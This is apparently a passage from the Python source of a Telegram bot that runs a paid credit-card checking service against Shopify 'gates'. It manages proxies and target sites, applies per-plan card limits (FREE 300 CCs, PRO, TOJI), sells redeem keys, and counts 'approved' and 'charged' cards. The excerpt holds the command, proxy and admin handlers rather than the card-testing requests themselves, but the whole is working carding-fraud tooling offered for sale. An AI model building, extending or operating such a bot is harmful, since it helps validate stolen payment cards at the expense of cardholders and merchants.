    pref_msg = await styled_reply(event, f"{PE} Show approved cards? (3 retries on site errors)", kb, emoji_ids=[CE["joker"]])
    USER_APPROVED_PREF[f"ran_{event.sender_id}"] = {"cards": cards, "sites": global_sites, "event": event, "pref_msg": pref_msg}
# ==================== SITE MANAGEMENT COMMANDS ====================
@client.on(events.NewMessage(pattern=r'(?i)^[/.]add\b'))
async def add_site_cmd(event):
    if await is_banned_user(event.sender_id):
        return await styled_reply(event, f"{PE} BANNED", emoji_ids=[CE["stop"]])
    text = re.sub(r'^[/.]add\s*', '', event.raw_text, flags=re.I).strip()
    if not text:
        return await styled_reply(event, f"{PE} Usage: /add site.com", emoji_ids=[CE["warn"]])
    sites = extract_urls_from_text(text)
    if not sites:
        return await styled_reply(event, f"{PE} No valid URLs", emoji_ids=[CE["cross"]])
    added = 0
    for site in sites:
        if await add_site_db(event.sender_id, site):
            added += 1
    await styled_reply(event, f"{PE} Added {added}/{len(sites)} sites", emoji_ids=[CE["check"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]rm\b'))
async def rm_site_cmd(event):
    if await is_banned_user(event.sender_id):
        return await styled_reply(event, f"{PE} BANNED", emoji_ids=[CE["stop"]])
    text = re.sub(r'^[/.]rm\s*', '', event.raw_text, flags=re.I).strip()
    if not text:
        return await styled_reply(event, f"{PE} Usage: /rm site.com", emoji_ids=[CE["warn"]])
    sites = extract_urls_from_text(text)
    removed = 0
    for site in sites:
        if await remove_site_db(event.sender_id, site):
            removed += 1
    await styled_reply(event, f"{PE} Removed {removed}/{len(sites)} sites", emoji_ids=[CE["check"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]check\b'))
async def check_sites_cmd(event):
    if await is_banned_user(event.sender_id):
        return await styled_reply(event, f"{PE} BANNED", emoji_ids=[CE["stop"]])
    proxy = await get_working_proxy(event.sender_id)
    if not proxy:
        proxy_count = await get_proxy_count(event.sender_id)
        if proxy_count == 0:
            return await styled_reply(event, f"{PE} No proxies found! Use /addpxy to add proxies first.", emoji_ids=[CE["warn"]])
        else:
            return await styled_reply(event, f"{PE} No working proxies found! Use /chkpxy to test your proxies.", emoji_ids=[CE["warn"]])
    sites = await get_user_sites(event.sender_id)
    if not sites:
        return await styled_reply(event, f"{PE} No sites in DB", emoji_ids=[CE["warn"]])
    status_msg = await styled_reply(event, f"{PE} Checking {len(sites)} sites...", emoji_ids=[CE["globe"]])
    working = []
    dead = []
    for site in sites:
        res = await test_single_site(site, user_id=event.sender_id)
        if res['status'] == 'working':
            working.append(site)
        else:
            dead.append(site)
    for d in dead:
        await remove_site_db(event.sender_id, d)
    result = f"{PE} Check done\n━━━━━━━━━━━━━━━━━\n✅ Working: {len(working)}\n❌ Dead (removed): {len(dead)}"
    await styled_edit(status_msg, result, emoji_ids=[CE["globe"], CE["tick"], CE["cross"]])

# ==================== PROXY COMMANDS ====================
@client.on(events.NewMessage(pattern=r'(?i)^[/.]addpxy(\s|$)'))
async def addpxy_cmd(event):
    if event.is_group:
        return await styled_reply(event, f"{PE} Private only", emoji_ids=[CE["stop"]])
    if await is_banned_user(event.sender_id):
        return await styled_reply(event, f"{PE} BANNED", emoji_ids=[CE["stop"]])
    await ensure_user(event.sender_id)
    proxy_lines = []
    if event.is_reply:
        reply_msg = await event.get_reply_message()
        if reply_msg.document:
            file_path = await reply_msg.download_media()
            try:
                async with aiofiles.open(file_path, 'r', encoding='utf-8') as f:
                    content = await f.read()
                    proxy_lines = [line.strip() for line in content.splitlines() if line.strip()]
            except Exception as e:
                await styled_reply(event, f"{PE} Error reading file: {e}", emoji_ids=[CE["cross"]])
                return
            finally:
                try:
                    os.remove(file_path)
                except:
                    pass
        elif reply_msg.text:
            proxy_lines = [line.strip() for line in reply_msg.text.splitlines() if line.strip()]
    if not proxy_lines:
        parts = event.raw_text.split(maxsplit=1)
        if len(parts) == 2:
            proxy_lines = [line.strip() for line in parts[1].splitlines() if line.strip()]
    if not proxy_lines:
        return await styled_reply(event,
            f"{PE} <b>Usage:</b>\n"
            f"<code>/addpxy ip:port:user:pass</code>\n"
            f"<code>/addpxy ip:port</code>\n\n"
            f"Or reply to a .txt file with proxies (one per line)",
            emoji_ids=[CE["warn"]])
    current_count = await get_proxy_count(event.sender_id)
    if current_count >= 100:
        return await styled_reply(event, f"{PE} Proxy limit reached (100/100). Use /rmpxy", emoji_ids=[CE["cross"]])
    parsed_proxies = []
    invalid_lines = []
    for line in proxy_lines:
        proxy_data = parse_proxy_format(line)
        if not proxy_data:
            invalid_lines.append(line)
        else:
            parsed_proxies.append(proxy_data)
    if not parsed_proxies:
        return await styled_reply(event, f"{PE} No valid proxies found.", emoji_ids=[CE["cross"]])
    slots_available = 100 - current_count
    if len(parsed_proxies) > slots_available:
        parsed_proxies = parsed_proxies[:slots_available]
        await styled_reply(event, f"{PE} Only adding {slots_available} proxies (limit 100)", emoji_ids=[CE["warn"]])
    status_msg = await styled_reply(event, f"{PE} Testing {len(parsed_proxies)} proxies...", emoji_ids=[CE["shield"]])
    added = []
    failed = []
    for proxy_data in parsed_proxies:
        ok, ip = await test_proxy(proxy_data['proxy_url'])
        if ok:
            await add_proxy_db(event.sender_id, proxy_data)
            added.append(proxy_data)
        else:
            failed.append(proxy_data)
    result_text = f"{PE} <b>Added {len(added)} working proxies</b>\n" if added else f"{PE} <b>No working proxies added</b>\n"
    for p in added:
        auth = f" ━ {p['username']}" if p.get('username') else ""
        result_text += f"┃ {p['type'].upper()} ━ {p['ip']}:{p['port']}{auth}\n"
    if failed:
        result_text += f"\n{PE} Failed ({len(failed)}):\n"
        for f in failed[:5]:
            result_text += f"┃ {f['type'].upper()} ━ {f['ip']}:{f['port']}\n"
        if len(failed) > 5:
            result_text += f"┃ ... and {len(failed)-5} more\n"
    if invalid_lines:
        result_text += f"\n{PE} Invalid format: {len(invalid_lines)} lines skipped"
    new_count = current_count + len(added)
    result_text += f"\n\n━━━━━━━━━━━━━━━━━\n📊 Total proxies: {new_count}/100"
    await styled_edit(status_msg, result_text, emoji_ids=[CE["check"], CE["tick"], CE["cross"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]proxy$'))
async def list_proxy_cmd(event):
    if event.is_group:
        return await styled_reply(event, f"{PE} Private only", emoji_ids=[CE["stop"]])
    proxies = await get_all_user_proxies(event.sender_id)
    if not proxies:
        return await styled_reply(event, f"{PE} No proxies", emoji_ids=[CE["cross"]])
    lines = [f"{i+1}. {p['proxy_type']} ━ {p['ip']}:{p['port']}" for i,p in enumerate(proxies)]
    await styled_reply(event, f"{PE} Proxies ({len(proxies)}/100)\n" + "\n".join(lines), emoji_ids=[CE["shield"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]chkpxy$'))
async def chkpxy_cmd(event):
    if event.is_group:
        return await styled_reply(event, f"{PE} Private only", emoji_ids=[CE["stop"]])
    proxies = await get_all_user_proxies(event.sender_id)
    if not proxies:
        return await styled_reply(event, f"{PE} No proxies", emoji_ids=[CE["cross"]])
    status_msg = await styled_reply(event, f"{PE} Testing {len(proxies)} proxies...", emoji_ids=[CE["shield"]])
    results = []
    working_count = 0
    dead_count = 0
    for idx, p in enumerate(proxies, start=1):
        ok, _ = await test_proxy(p['proxy_url'])
        if ok:
            working_count += 1
            results.append(f"✅ {idx}. {p['proxy_type'].upper()} ━ {p['ip']}:{p['port']} (Working)")
        else:
            dead_count += 1
            results.append(f"❌ {idx}. {p['proxy_type'].upper()} ━ {p['ip']}:{p['port']} (Dead)")
    header = f"{PE} <b>Proxy Check Results</b>\n━━━━━━━━━━━━━━━━━\n"
    body = "\n".join(results)
    footer = f"\n━━━━━━━━━━━━━━━━━\n{PE} Working: {working_count} | {PE} Dead: {dead_count}"
    full_text = header + body + footer
    await styled_edit(status_msg, full_text, emoji_ids=[CE["globe"], CE["tick"], CE["cross"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]rmpxy(\s.+)?$'))
async def rmpxy_cmd(event):
    if event.is_group:
        return await styled_reply(event, f"{PE} Private only", emoji_ids=[CE["stop"]])
    proxies = await get_all_user_proxies(event.sender_id)
    if not proxies:
        return await styled_reply(event, f"{PE} No proxies", emoji_ids=[CE["cross"]])
    parts = event.raw_text.split(maxsplit=1)
    if len(parts) < 2:
        return await styled_reply(event, f"{PE} Usage: /rmpxy index or all", emoji_ids=[CE["warn"]])
    arg = parts[1].strip().lower()
    if arg == 'all':
        count = await clear_all_proxies(event.sender_id)
        await styled_reply(event, f"{PE} Removed {count} proxies", emoji_ids=[CE["check"]])
    else:
        try:
            idx = int(arg)-1
            removed = await remove_proxy_by_index(event.sender_id, idx)
            if removed:
                await styled_reply(event, f"{PE} Removed {removed['ip']}:{removed['port']}", emoji_ids=[CE["check"]])
            else:
                await styled_reply(event, f"{PE} Invalid index", emoji_ids=[CE["cross"]])
        except:
            await styled_reply(event, f"{PE} Invalid index", emoji_ids=[CE["cross"]])

# ==================== USER COMMANDS ====================
@client.on(events.NewMessage(pattern=r'(?i)^[/.]info$'))
async def info_cmd(event):
    if await is_banned_user(event.sender_id):
        return await styled_reply(event, f"{PE} BANNED", emoji_ids=[CE["stop"]])
    plan = await get_user_plan(event.sender_id)
    limit = get_cc_limit(plan, event.sender_id)
    sites = await get_user_sites(event.sender_id)
    proxies = await get_all_user_proxies(event.sender_id)
    text = f"{PE} <b>Profile</b>\n━━━━━━━━━━━━━━━━━\nID: {event.sender_id}\nPlan: {plan.upper()}\nCC Limit: {limit}\nSites: {len(sites)}\nProxies: {len(proxies)}"
    await styled_reply(event, text, emoji_ids=[CE["info"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]redeem\b'))
async def redeem_cmd(event):
    if await is_banned_user(event.sender_id):
        return await styled_reply(event, f"{PE} BANNED", emoji_ids=[CE["stop"]])
    parts = event.raw_text.split()
    if len(parts) != 2:
        return await styled_reply(event, f"{PE} Usage: /redeem KEY", emoji_ids=[CE["warn"]])
    key = parts[1].upper()
    success, msg = await use_key(event.sender_id, key)
    if success:
        await styled_reply(event, f"{PE} {msg}", emoji_ids=[CE["gift"]])
    else:
        await styled_reply(event, f"{PE} {msg}", emoji_ids=[CE["cross"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]plan$'))
async def plan_cmd(event):
    plan = await get_user_plan(event.sender_id)
    text = f"""{PE} <b>Plans</b>
━━━━━━━━━━━━━━━━━
<b>FREE</b>: 300 CCs (group only)
<b>PRO</b>: 2000 CCs + proxy + private
<b>TOJI</b>: 5000 CCs + priority
━━━━━━━━━━━━━━━━━
Your plan: <b>{plan.upper()}</b>
Contact @MRROOTTG"""
    await styled_reply(event, text, emoji_ids=[CE["crown"]])

# ==================== ADMIN COMMANDS ====================
@client.on(events.NewMessage(pattern='/stats'))
async def stats_cmd(event):
    if event.sender_id not in ADMIN_ID:
        return await styled_reply(event, f"{PE} Admin only", emoji_ids=[CE["stop"]])
    try:
        total_users = await get_total_users()
        total_premium = await get_premium_count()
        total_free = total_users - total_premium
        total_sites = await get_total_sites_count()
        all_keys = await get_all_keys()
        total_keys = len(all_keys)
        used_keys = len([k for k in all_keys if k.get('used', False)])
        unused_keys = total_keys - used_keys
        total_cards = await get_total_cards_count()
        approved_cards = await get_approved_count()
        stats_text = f"""{PE} <b>BOT STATISTICS</b>
━━━━━━━━━━━━━━━━━
👥 <b>USERS</b>
━ Total: {total_users}
━ Premium: {total_premium}
━ Free: {total_free}
🌐 <b>SITES</b>
━ Total added: {total_sites}
🔑 <b>KEYS</b>
━ Generated: {total_keys}
━ Used: {used_keys}
━ Unused: {unused_keys}
💳 <b>CARD STATS</b>
━ Processed: {total_cards}
━ Approved: {approved_cards}
━━━━━━━━━━━━━━━━━
⚡ Generated: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"""
        await styled_reply(event, stats_text, emoji_ids=[CE["chart"]])
    except Exception as e:
        await styled_reply(event, f"{PE} Error: {e}", emoji_ids=[CE["cross"]])

@client.on(events.NewMessage(pattern='/genkey'))
async def genkey_admin(event):
    if event.sender_id not in ADMIN_ID:
        return await styled_reply(event, f"{PE} Admin only", emoji_ids=[CE["stop"]])
    parts = event.raw_text.split()
    if len(parts) != 4:
        return await styled_reply(event, f"{PE} Usage: /genkey pro 5 30", emoji_ids=[CE["warn"]])
    plan_type = parts[1].lower()
    try:
        amount = int(parts[2])
        days = int(parts[3])
    except ValueError:
        return await styled_reply(event, f"{PE} Amount and duration must be numbers", emoji_ids=[CE["cross"]])
    if plan_type not in ('free', 'pro', 'toji'):
        return await styled_reply(event, f"{PE} Invalid plan. Use: free, pro, toji", emoji_ids=[CE["cross"]])
    if amount <= 0 or amount > 20:
        return await styled_reply(event, f"{PE} Amount must be between 1 and 20", emoji_ids=[CE["warn"]])
    plan_display = {
        'free': ('FREE', CE["star"]),
        'pro': ('PRO', CE["bolt"]),
        'toji': ('TOJI', CE["crown"])
    }
    plan_name, plan_emoji_id = plan_display[plan_type]
    keys = []
    for _ in range(amount):
        k = ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))
        await create_key(k, days, plan_type)
        keys.append(k)
    header = f"{PE} <b>Plan Keys Generated</b>\n━━━━━━━━━━━━━━━━━\nPlan: {plan_name}\nAmount: {amount}\nDuration: {days} days\n━━━━━━━━━━━━━━━━━\n"
    key_lines = []
    for i, k in enumerate(keys):
        if i > 0:
            key_lines.append("")
        key_lines.append(f"🔑 <code>{k}</code> ━ {plan_name} ━ {days} days")
    keys_section = "\n".join(key_lines)
    footer = f"\n━━━━━━━━━━━━━━━━━\n{PE} Users can redeem with: <code>/redeem KEY</code>"
    full_message = header + keys_section + footer
    placeholder_count = full_message.count(PE)
    emoji_ids = []
    for i in range(placeholder_count):
        if i == 0:
            emoji_ids.append(CE["star"])
        else:
            emoji_ids.append(plan_emoji_id)
    await styled_reply(event, full_message, emoji_ids=emoji_ids)

@client.on(events.NewMessage(pattern='/unban'))
async def unban_admin(event):
    if event.sender_id not in ADMIN_ID:
        return await styled_reply(event, f"{PE} Admin only", emoji_ids=[CE["stop"]])
    parts = event.raw_text.split()
    if len(parts) != 2:
        return await styled_reply(event, f"{PE} /unban user_id", emoji_ids=[CE["warn"]])
    uid = int(parts[1])
    await unban_user(uid)
    await styled_reply(event, f"{PE} Unbanned {uid}", emoji_ids=[CE["check"]])

@client.on(events.NewMessage(pattern='/ban'))
async def ban_admin(event):
    if event.sender_id not in ADMIN_ID:
        return await styled_reply(event, f"{PE} Admin only", emoji_ids=[CE["stop"]])
    parts = event.raw_text.split()
    if len(parts) != 2:
        return await styled_reply(event, f"{PE} /ban user_id", emoji_ids=[CE["warn"]])
    uid = int(parts[1])
    await ban_user(uid)
    await styled_reply(event, f"{PE} Banned {uid}", emoji_ids=[CE["stop"]])

@client.on(events.NewMessage(pattern='/delkey'))
async def delkey_admin(event):
    if event.sender_id not in ADMIN_ID:
        return await styled_reply(event, f"{PE} Admin only", emoji_ids=[CE["stop"]])
    parts = event.raw_text.split()
    if len(parts) != 2:
        return await styled_reply(event, f"{PE} /delkey KEY", emoji_ids=[CE["warn"]])
    key = parts[1].upper()
    await delete_key(key)
    await styled_reply(event, f"{PE} Deleted key: {key}", emoji_ids=[CE["check"]])

@client.on(events.NewMessage(pattern='/setplan'))
async def setplan_admin(event):
    if event.sender_id not in ADMIN_ID:
        return await styled_reply(event, f"{PE} Admin only", emoji_ids=[CE["stop"]])
    parts = event.raw_text.split()
    if len(parts) != 3:
        return await styled_reply(event, f"{PE} /setplan user_id plan", emoji_ids=[CE["warn"]])
    uid = int(parts[1])
    plan = parts[2].lower()
    if plan not in ('free', 'pro', 'toji'):
        return await styled_reply(event, f"{PE} Invalid plan. Use: free, pro, toji", emoji_ids=[CE["cross"]])
    await set_user_plan(uid, plan)
    await styled_reply(event, f"{PE} Set {uid} to {plan.upper()} plan", emoji_ids=[CE["check"]])

# ==================== SHUTDOWN HANDLER ====================
async def shutdown(sig=None):
    print("Shutting down...")
    
    await _safe_close_session()
    print("Closed global aiohttp session.")
    
    try:
        await close_db()
    except Exception as e:
        print(f"Error closing DB: {e}")
    
    try:
        await client.disconnect()
    except Exception as e:
        print(f"Error disconnecting: {e}")
    
    print("Bot disconnected.")

async def main():
    try:
        await init_db()
        print("🚀 Starting bot with ONLY Shopify Gates!")
        print("   ✅ IMPROVED: 3 retries with different sites for /mtxt and /ran")
        print("   Commands: /sh (single), /mtxt (mass with 3 retries), /ran (random with 3 retries)")
        print("   NOTE: Charged cards are NOT saved to database. Only Approved cards are saved.")
        await client.start(bot_token=BOT_TOKEN)
        print("✅ Bot is running!")
        loop = asyncio.get_running_loop()
        for sig in (signal.SIGINT, signal.SIGTERM):
            loop.add_signal_handler(sig, lambda: asyncio.create_task(shutdown()))
        await client.run_until_disconnected()
    except Exception as e:
        print(f"FATAL ERROR: {e}")
        import traceback
        traceback.print_exc()
    finally:
        await shutdown()

if __name__ == "__main__":
    asyncio.run(main())
